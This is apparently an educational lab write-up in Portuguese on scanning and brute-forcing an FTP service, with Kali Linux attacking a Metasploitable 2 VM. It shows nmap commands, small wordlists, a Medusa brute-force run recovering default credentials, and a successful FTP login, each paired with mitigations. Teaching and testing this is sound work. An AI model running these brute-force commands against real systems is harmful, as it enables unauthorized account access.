# 🛡️ Documentação Educacional: Compreendendo e Mitigando Ataques FTP de Força Bruta

Esta documentação tem o objetivo de educar sobre as técnicas de varredura e força bruta usadas contra serviços FTP, utilizando **Kali Linux** como sistema operacional atacante e **Metasploitable 2** como máquina alvo vulnerável.

---

## 1. 🌐 Reconhecimento e Varredura (Nmap)

**Conceito:** O reconhecimento é o estágio inicial onde um testador de segurança identifica hosts ativos e os serviços rodando neles. O **Nmap** (Network Mapper) é a ferramenta padrão para este fim.

**Objetivo:** Identificar se a porta **21 (FTP)** está aberta e acessível.

**Comando utilizado:**

```bash
$ nmap -sV -p 21 192.168.56.101
````

**Saída do Terminal:**

```text
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-22 03:07 -03
Nmap scan report for 192.168.56.101
Host is up (0.00054s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 08:00:27:3A:2B:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 23.57 seconds
```

### 🛡️ Defesa (Mitigação)

  * **Firewall:** Bloquear o acesso à porta 21 de endereços IP externos não confiáveis. O acesso deve ser restrito a redes internas ou IPs específicos (princípio do **menor privilégio**).
  * **Monitoramento de Rede:** Utilizar um **IDS/IPS (Intrusion Detection/Prevention System)** para alertar sobre varreduras de porta excessivas.

-----

## 2\. 📝 Enumeração e Coleta de Informações

**Conceito:** Após a varredura, a enumeração foca em coletar informações detalhadas sobre o serviço. No caso do FTP, isso pode incluir a versão do software e se o **acesso anônimo** está permitido.

**Objetivo:** Obter a versão do servidor FTP para identificar possíveis vulnerabilidades conhecidas (CVEs).

**Resultado da Enumeração:**

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

### 🛡️ Defesa (Mitigação)

  * **Desativar Acesso Anônimo:** Se não for estritamente necessário, configure o servidor FTP para **não permitir** logins anônimos.
  * **Ocultar/Alterar Banners:** Configurar o servidor para não divulgar a versão exata do software no *banner* (técnica de *security through obscurity*), dificultando o trabalho do atacante.
  * **Atualização de Software:** Manter o software FTP (como ProFTPD, vsftpd) **sempre atualizado** para corrigir vulnerabilidades conhecidas.

-----

## 3\. 💣 Quebra de Senha de Força Bruta (Medusa)

**Conceito:** A força bruta envolve tentar um grande número de combinações de nome de usuário e senha até encontrar uma válida. O **Medusa** é uma ferramenta popular para testes de força bruta em diversos protocolos.

**Wordlists:** Os atacantes criam ou usam listas pré-existentes (`wordlists`) que contêm senhas e nomes de usuário comuns.

**Passo 1: Criação das Wordlists**

```bash
$echo -e "user\nmsfadmin\nnadmin\nnroot" > users.txt$ echo -e "123456\nnpassword\nnqwerty\nmsfadmin" > pass.txt
```

**Passo 2: Execução do Ataque**

**Objetivo:** Encontrar credenciais válidas para obter acesso não autorizado ao sistema.

```bash
$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

**Saída do Terminal (Sucesso):**

```text
2025-11-22 02:22:32 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
...
2025-11-22 02:22:33 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
...
2025-11-22 02:22:38 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
```

### 🛡️ Defesa (Mitigação Crucial)

  * **Políticas de Senha Fortes:** Impor senhas longas, complexas e que sejam trocadas regularmente.
  * **Bloqueio de Contas (Rate Limiting):** Configurar o servidor para **bloquear temporariamente** um IP ou usuário após um pequeno número de tentativas falhas (ex: 5 falhas em 5 minutos).
  * **Autenticação de Dois Fatores (2FA):** Implementar 2FA, tornando a quebra por força bruta inútil.
  * **Usar SFTP/FTPS:** Evitar o FTP simples (texto claro). Usar **SFTP** ou **FTPS** para criptografar a comunicação.

-----

### 🔌 Validação do Acesso

Confirmando a invasão conectando com as credenciais descobertas:

```bash
$ ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kaht): msfadmin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

-----

## 4\. 🔗 Resumo das Defesas

| Risco de Segurança | Ferramentas Usadas | Estratégia de Defesa Recomendada |
| :--- | :--- | :--- |
| **Descoberta de Porta 21** | Nmap | Firewall com lista de acesso restrito (ACL). |
| **Enumeração de Versão** | Nmap | Desativar banners de versão e manter software atualizado. |
| **Força Bruta de Credenciais** | Medusa | Bloqueio de IP após falhas, senhas fortes, 2FA, e usar SFTP/FTPS. |

```
```
